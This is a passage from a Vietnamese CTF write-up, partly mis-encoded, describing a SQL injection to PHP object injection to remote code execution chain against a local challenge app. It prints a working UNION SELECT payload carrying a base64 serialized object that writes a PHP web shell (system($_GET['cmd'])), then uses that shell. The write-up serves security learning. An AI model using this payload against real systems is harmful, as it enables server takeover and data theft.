<p>á» Ä‘Ã¢y ká»‹ch báº£n táº¥n cÃ´ng cá»§a mÃ¬nh sáº½ lÃ  cá»‘ gáº¯ng <code>insert</code> Ä‘Æ°á»£c Ä‘oáº¡n mÃ£ base64 rá»“i sau Ä‘Ã³ sáº½ sá»­a <code>price=999999999</code> Ä‘á»ƒ nÃ³ gá»i táº¥t cáº£ cÃ¡c báº£ng vÃ  unserialize vÃ  khi nÃ³ giáº£i mÃ£ <code>base64</code> thÃ¬ cÃ¡i <code>oldValue</code> sáº½ giÃºp ta táº¡o ra Ä‘Æ°á»£c file <code>shell.php</code> náº±m ngay trong <code>/www/</code>.</p>
<p><img src="https://hackmd.io/_uploads/SJK3yIMSge.png" alt="image"></p>
<p>Sau khi cá»‘ gáº¯ng Insert mÃ¬nh sáº½ sá»­a parameter pricer&#x3D;99999999 Ä‘á»ƒ cho nÃ³ gá»i full báº£ng vÃ  thá»±c hiá»‡n quÃ¡ trÃ¬nh serialize vÃ  unserialize vá»›i mong muá»‘n nÃ³ sáº½ táº¡o file shell.php trong &#x2F;www&#x2F;.</p>
<p><img src="https://hackmd.io/_uploads/r1YmxUGree.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/r1ZUl8Mrlx.png" alt="image"></p>
<p>CÃ³ váº» nhÆ° ká»‹ch báº£n Insert cá»§a mÃ¬nh Ä‘Ã£ tháº¥t báº¡i vÃ¬ khÃ´ng cÃ³ má»™t file nÃ o Ä‘Æ°á»£c táº¡o á»Ÿ bÃªn trong docker váº­y nÃªn ta sáº½ pháº£i suy nghÄ© Ä‘áº¿n ká»‹ch báº£n táº¥n cÃ´ng, váº¥n Ä‘á» á»Ÿ Ä‘Ã¢y lÃ  ngoÃ i Insert liá»‡u cÃ³ cÃ¡ch nÃ o Ä‘á»ƒ ta cÃ³ thá»ƒ control Ä‘Æ°á»£c luá»“ng dá»¯ liá»‡u mÃ¬nh thÃªm vÃ o hay khÃ´ng?</p>
<p><img src="https://hackmd.io/_uploads/B104MIfrle.png" alt="image"></p>
<p>á» Ä‘Ã¢y Ä‘á»ƒ xem cÃ¡i ká»‹ch báº£n Insert cá»§a mÃ¬nh cÃ³ á»•n khÃ´ng thÃ¬ mÃ¬nh Ä‘Ã£ truy cáº­p tháº³ng vÃ o DB cá»§a docker vÃ  tiáº¿n hÃ nh Insert tháº³ng vÃ o báº£ng luÃ´n vÃ  nhÆ° áº£nh trÃªn thÃ¬ dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c Ä‘Æ°a vÃ o bÃ¢y giá» mÃ¬nh sáº½ dÃ¹ng <code>curl &quot;http://localhost:1337/?price=999999999&quot;</code> Ä‘á»ƒ nÃ³ gá»i háº¿t báº£ng.</p>
<p><img src="https://hackmd.io/_uploads/rk1yX8GHlx.png" alt="image"></p>
<p>á» Ä‘Ã¢y cÃ³ thá»ƒ tháº¥y nÃ³ Ä‘Ã£ thá»±c sá»± work náº¿u ta Insert tháº³ng vÃ o báº£ng báº±ng DB docker, tá»« Ä‘Ã¢y ta sáº½ suy nghÄ© ráº±ng cÃ³ láº½ Ä‘Ã£ cÃ³ Ä‘oáº¡n code nÃ o Ä‘Ã³ ngÄƒn cháº·n user sá»­ dá»¥ng Insert Ä‘á»ƒ inject value vÃ o báº£ng.<br>BÃ¢y giá» ta sáº½ tiáº¿n hÃ nh Ä‘i kiá»ƒm tra code Ä‘á»ƒ xem lÃ½ do vÃ¬ sao ta khÃ´ng sá»­ dá»¥ng Insert Ä‘Æ°á»£c.</p>
<p><img src="https://hackmd.io/_uploads/Sk7IQuMHel.png" alt="image"></p>
<p>á» Ä‘Ã¢y sau khi Ä‘á»c thÃ¬ nÃ³ chá»‰ cho phÃ©p mÃ¬nh sá»­ dá»¥ng SELECT vÃ  UPDATE thay vÃ¬ Insert. Dá»±a theo Ä‘Ã³ mÃ¬nh Ä‘Ã£ thá»­ UPDATE nhÆ°ng nháº­n ra lÃ  web app khÃ´ng cÃ³ Ä‘iá»ƒm nÃ o Ä‘á»ƒ cÃ³ thá»ƒ cáº­p nháº­t dá»¯ liá»‡u tá»« Ä‘Ã³ sá»­ dá»¥ng UPDATE Ä‘á»ƒ thay Ä‘á»•i giÃ¡ trá»‹ tháº¿ nÃªn chá»‰ cÃ²n má»—i SELECT. Váº­y á»Ÿ Ä‘Ã¢y lÃ m sao Ä‘á»ƒ dÃ¹ng SELECT Ä‘á»ƒ thay Ä‘á»•i vÃ  Insert Ä‘Æ°á»£c payload vÃ o báº£ng, sau khi tÃ¬m kiáº¿m thÃ¬ UNION SELECT cÃ³ kháº£ thi Ä‘á»ƒ cÃ³ thá»ƒ Insert Ä‘Æ°á»£c payload vÃ o mÃ  khÃ´ng cáº§n dÃ¹ng Ä‘áº¿n Insert.</p>
<p>Báº£ng Ä‘Ã­ch: food</p>
<p>CÃ¡c cá»™t: id, name, oldvalue, price</p>
<p>Má»¥c tiÃªu: ChÃ¨n payload PHP Object Injection vÃ o cá»™t oldvalue</p>
<p>Tiáº¿n hÃ nh chÃ¨n cÃ¢u Sql vÃ o <code>-1+UNION+SELECT+999%2C+&#39;hacked&#39;%2C+&#39;TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTQ6Ii93d3cvc2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO30%3D&#39;%2C+1</code> thÃ¬ nÃ³ sáº½ dá»±a theo cÃ¢u Database trá»Ÿ thÃ nh:<br><code>SELECT id, name, oldvalue, price FROM food WHERE price &lt; -1 UNION SELECT 999, &#39;hacked&#39;, &#39;TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTQ6Ii93d3cvc2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO30=&#39;, 1</code>.</p>
<p><img src="https://hackmd.io/_uploads/BJYcV_Mrxl.png" alt="image"></p>
<p>Sau khi inject thÃ nh cÃ´ng nÃ³ tráº£ vá» cho ta má»™t trang tráº¯ng xÃ³a, Ä‘Ã¢y lÃ  má»™t dáº¥u hiá»‡u tá»‘t vÃ¬ khi nÃ³ Ä‘Æ°á»£c Ä‘áº©y lÃªn thÃ nh cÃ´ng mÃ  khÃ´ng cÃ³ lá»—i nÃ³ sáº½ tráº¯ng nhÆ° nÃ y.</p>
<p><img src="https://hackmd.io/_uploads/HybkB_Mrle.png" alt="image"></p>
<p>Kiá»ƒm tra file docker nÃ³ cÃ³ nháº£y file shell khÃ´ng vÃ  Ä‘Ã£ thÃ nh cÃ´ng táº¡o ra file shell.php náº±m ngay á»Ÿ &#x2F;www&#x2F; lÃ  root cá»§a docker container.</p>
<p><img src="https://hackmd.io/_uploads/HypQr_GHxg.png" alt="image"></p>
<p>ThÃ nh cÃ´ng cháº¡y Ä‘áº¿n &#x2F;shell.php vÃ  tiáº¿n hÃ nh truyá»n cÃ¢u lá»‡nh <code>ls</code> Ä‘á»ƒ Ä‘á»c Ä‘Æ°á»£c cÃ¡c File trong Ä‘Ã³.</p>
<p><img src="https://hackmd.io/_uploads/B1GDHOzSlg.png" alt="image"></p>
<p>Äá»c Ä‘Æ°á»£c cÃ¡c Logs á»Ÿ trong logs.txt mÃ  chá»‰ admin cÃ³ thá»ƒ Ä‘á»c.<br>Váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh má»¥c tiÃªu RCE Ä‘Æ°á»£c web nÃ y sá»­ dá»¥ng Exploit Chain lÃ  SQLi+PHP Object Injection to RCE.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/">https://pzhat.github.io/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLá»— há»•ng File UploadBáº£n cháº¥t cá»§a File Upload: File Upload Ä‘á»‘i vá»›i tÃ´i nÃ³ Ä‘Æ¡n giáº£n chá»‰ lÃ  lá»£idá»¥ng Unsafe Method Ä‘á»ƒ truyá»n má»™t Untrusted Data vÃ o nháº±m thay Ä‘á»•i hÃ nhvi cá»§a há»‡ thá»‘ng trong trÆ°á»ng há»£p nÃ y lÃ  Web App, vá»›i FileUpload nhá»¯ng gÃ¬User Upload lÃªn sáº½ chÃ­nh lÃ  Untrusted Data vÃ  vá»›i Feature Upload FilenhÆ° nÃ y sáº½ tháº¿ nÃ o náº¿u nÃ³ khÃ´ng Ä‘Æ°á»£c Validate má»™t cÃ¡ch cáº©n tháº­n ta sáº½Ä‘áº¿n vá»›i DEMO báº±ng Java Servlet. Web App OverviewÄÃ¢y lÃ  má»™t Web App Ä‘Æ°á»£c dá»±ng v...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/" title="CyberCon 2025 SafeUpload Web Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CyberCon 2025 SafeUpload Web Challenge</div></div><div class="info-2"><div class="info-item-1">CyberCon 2025 SafeUpload Web ChallengeTá»•ng quan challenge Má»Ÿ challenge lÃªn thÃ¬ ta tháº¥y nÃ³ cáº¥p cho ta má»™t giao diá»‡n dÃ¹ng Ä‘á»ƒ upload file nÃªn nghi ngá» ban Ä‘áº§u sáº½ lÃ  web nÃ y dÃ­nh lá»— há»•ng file upload. Tiáº¿n hÃ nh thá»­ upload lÃªn file php vá»›i ná»™i dung: 123&lt;?phpecho &quot;test&quot;;?&gt;   CÃ³ váº» nhÆ° Ä‘Ã£ dÃ­nh filter cá»§a bÃ i cÃ³ thá»ƒ tháº¥y nÃ³ Ä‘Ã£ xoÃ¡ Ä‘i file mÃ¬nh upload lÃªn, bÃ¢y giá» ta thá»­ upload 1 file php nhÆ°ng khÃ´ng cÃ³ ná»™i dung.  Váº«n lÃ  file Ä‘Ã³ nhÆ°ng khÃ´ng cÃ³ ná»™i dung thÃ¬ hoÃ n toÃ n cÃ³ thá»ƒ upload bÃ¬nh t...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTá»•ng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)ÄÃ¢y lÃ  má»™t Website cÃ³ chá»©c nÄƒng lÃ  nslookup sá»­ dá»¥ng hÃ m shell_exec cá»§a php Ä‘á»ƒ thá»±c thi. Ta tiáº¿n hÃ nh truy cáº­p Ä‘á»ƒ xem giao diá»‡n cá»§a web app.á» Ä‘Ã¢y ta tháº¥y nÃ³ khÃ¡ lÃ  basic khi chá»‰ cÃ³ duy nháº¥t má»™t nÆ¡i cÃ³ chá»©c nÄƒng nslookup vÃ  bÃªn cáº¡nh lÃ  source code cho sáºµn cá»§a chall, ta sáº½ tiáº¿n hÃ nh phÃ¢n tÃ­ch source code Ä‘Æ°á»£c cáº¥p sáºµn. á» ngay Ä‘áº§u tiÃªn ta gáº·p khá»Ÿi táº¡o vÃ  include file design vÃ  táº¡o object ($design) cÃ³ tÃªn lÃ  NSLookup Tool. Äáº¿n vá»›i nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-26-WebSecFr-Level1/" title="WebSec.fr level 1 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr level 1 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr level 1 CTF challengeOverview Giao diá»‡n chá»©c nÄƒng cá»§a level nÃ y ta cÃ³ thá»ƒ tháº¥y nÃ³ lÃ  má»™t web app cÃ³ chá»©c nÄƒng hiá»ƒn thá»‹ username báº±ng cÃ¡ch nháº­p vÃ o userID nÃªn bÆ°á»›c Ä‘áº§u ta cÃ³ thá»ƒ nghi ngá» nÃ³ dÃ­nh Sql Injection. PhÃ¢n tÃ­ch source code123456789101112131415161718192021222324252627282930313233&lt;?phpsession_start ();ini_set(&#x27;display_errors&#x27;, &#x27;on&#x27;);ini_set(&#x27;error_reporting&#x27;, E_ALL);include &#x27;anti_csrf.php&#x27;;init_token ();class LevelOne &#123;    public...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-15-CBJS-Java-Deserialize/" title="Java Deserialize CBJS Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Deserialize CBJS Lab</div></div><div class="info-2"><div class="info-item-1">Java Deserialize CBJS LabGiáº£i thÃ­ch chi tiáº¿t vá» lá»— há»•ng Deserialization1. Deserialization lÃ  gÃ¬?  Serialization lÃ  quÃ¡ trÃ¬nh chuyá»ƒn Ä‘á»•i má»™t object (Ä‘á»‘i tÆ°á»£ng) trong bá»™ nhá»› thÃ nh má»™t Ä‘á»‹nh dáº¡ng cÃ³ thá»ƒ lÆ°u trá»¯ hoáº·c truyá»n táº£i (nhÆ° byte stream, JSON, XML).  Deserialization lÃ  quÃ¡ trÃ¬nh ngÆ°á»£c láº¡i - chuyá»ƒn Ä‘á»•i dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c serialize trá»Ÿ láº¡i thÃ nh object trong bá»™ nhá»›.   2. NguyÃªn nhÃ¢n Lá»— há»•ng xáº£y ra khi:  á»¨ng dá»¥ng deserialize dá»¯ liá»‡u tá»« nguá»“n khÃ´ng tin cáº­y (user input, network). KhÃ´ng cÃ³ validati...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/" title="Spring Time CTF challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Spring Time CTF challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">Spring Time CTF challenge WriteUp Web App Ä‘Æ°á»£c chia lÃ m 2 services khÃ¡c nhau bao gá»“m:  gateman : port 8080 newsman : port 8082  PhÃ¢n tÃ­ch tá»«ng chá»©c nÄƒng tá»«ng service Gateman   NÃ³ Ä‘Æ°á»£c cháº¡y báº±ng port 8080 bÃªn cáº¡nh Ä‘Ã³ nÃ³ cÃ²n gá»i cloud cÃ¹ng vá»›i Ä‘Ã³ lÃ  expose include ra cÃ¡c chá»©c nÄƒng nhÆ° health , info , gateway. Váº­y nÃªn cÃ³ thá»ƒ biáº¿t Ä‘Æ°á»£c Ä‘Ã¢y lÃ  service Spring Cloud vá»›i chá»©c nÄƒng routing Ä‘áº¿n cÃ¡c routes.  Newsman  Ta sáº½ Ä‘i tháº³ng vÃ o luÃ´n Ä‘áº§u tiÃªn lÃ  NewsController.class:  1234567891011121314151617181...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CanteenFood-CTF-Challenge-WriteUp-by-Phatmh"><span class="toc-number">1.</span> <span class="toc-text">CanteenFood CTF Challenge WriteUp by @Phatmh</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tien-hanh-phan-tich-chuc-nang-theo-kieu-BlackBox"><span class="toc-number">1.1.</span> <span class="toc-text">Tiáº¿n hÃ nh phÃ¢n tÃ­ch chá»©c nÄƒng theo kiá»ƒu BlackBox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tien-hanh-phan-tich-Source-Code-cho-san"><span class="toc-number">1.2.</span> <span class="toc-text">Tiáº¿n hÃ nh phÃ¢n tÃ­ch Source Code cho sáºµn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Giai-thich-chi-tiet-chuoi-exploit-CTF"><span class="toc-number">2.</span> <span class="toc-text">Giáº£i thÃ­ch chi tiáº¿t chuá»—i exploit CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-Tong-quan-kien-truc-ung-dung"><span class="toc-number">2.1.</span> <span class="toc-text">ğŸ“‹ Tá»•ng quan kiáº¿n trÃºc á»©ng dá»¥ng</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cac-thanh-phan-chinh"><span class="toc-number">2.1.1.</span> <span class="toc-text">CÃ¡c thÃ nh pháº§n chÃ­nh:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Luong-du-lieu"><span class="toc-number">2.1.2.</span> <span class="toc-text">Luá»“ng dá»¯ liá»‡u:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phan-tich-tung-lo-hong"><span class="toc-number">2.2.</span> <span class="toc-text">PhÃ¢n tÃ­ch tá»«ng lá»— há»•ng</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-Injection-filterFood"><span class="toc-number">2.2.1.</span> <span class="toc-text">1. SQL Injection (filterFood)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-PHP-Object-Injection-getFood-filterFood"><span class="toc-number">2.2.2.</span> <span class="toc-text">2. PHP Object Injection (getFood &amp; filterFood)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Arbitrary-File-Write-wakeup-magic-method"><span class="toc-number">2.2.3.</span> <span class="toc-text">3. Arbitrary File Write (__wakeup magic method)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chuoi-exploit-chi-tiet"><span class="toc-number">2.3.</span> <span class="toc-text">Chuá»—i exploit chi tiáº¿t</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/25/2025-11-25-GraphQL-API-Vulnerability/" title="GraphQL API Vulnerability">GraphQL API Vulnerability</a><time datetime="2025-11-24T21:38:11.491Z" title="Created 2025-11-25 04:38:11">2025-11-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/16/2025-11-16-CORS-PortSwigger/" title="PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp</a><time datetime="2025-11-16T09:11:55.936Z" title="Created 2025-11-16 16:11:55">2025-11-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-03-I.redteam-Kerberoasting/" title="Ired.Team Kerberoasting (Credential Access)">Ired.Team Kerberoasting (Credential Access)</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-04-THM-Basic-Pentesting/" title="Tryhackme Basic Pentesting Challenge">Tryhackme Basic Pentesting Challenge</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-I.redteam-Kerberos-Golden-Ticket/" title="Ired.Team Kerberos Golden Tickets Lab">Ired.Team Kerberos Golden Tickets Lab</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>